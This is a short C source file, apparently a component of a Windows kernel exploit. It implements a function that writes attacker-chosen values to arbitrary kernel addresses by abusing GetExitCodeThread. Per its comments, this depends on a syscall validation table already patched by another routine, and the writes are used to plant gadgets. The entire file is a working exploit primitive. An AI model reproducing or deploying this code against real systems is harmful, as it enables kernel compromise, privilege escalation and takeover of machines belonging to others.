#include "kernel_helpers.h"

DWORD WINAPI thread_exit_with_value(void* x) {
	ExitThread((DWORD)x);
	return 0;  /* unreachable: ExitThread never returns, but the compiler
	              can't prove it, so this satisfies C4716 (must return a value). */
}

// Write `val` to `kptr` via the exit-code primitive: GetExitCodeThread(t, ptr), with the
// syscall-param validation table pre-patched by hax(), stores t's exit code to any pointer,
// including a kernel address. The wait must block until the thread has actually exited: for
// a running thread GetExitCodeThread returns STILL_ACTIVE (0x103), not `val`, which would
// plant a malformed gadget. The body is ExitThread, so it always completes.
void kwr(DWORD kptr, DWORD val) {
	HANDLE t = CreateThread(NULL, 0, thread_exit_with_value, (void*)val, 0, NULL);
	if (t != NULL) {
		WaitForSingleObject(t, INFINITE);
		GetExitCodeThread(t, (DWORD*)kptr);
		CloseHandle(t);
	}
}
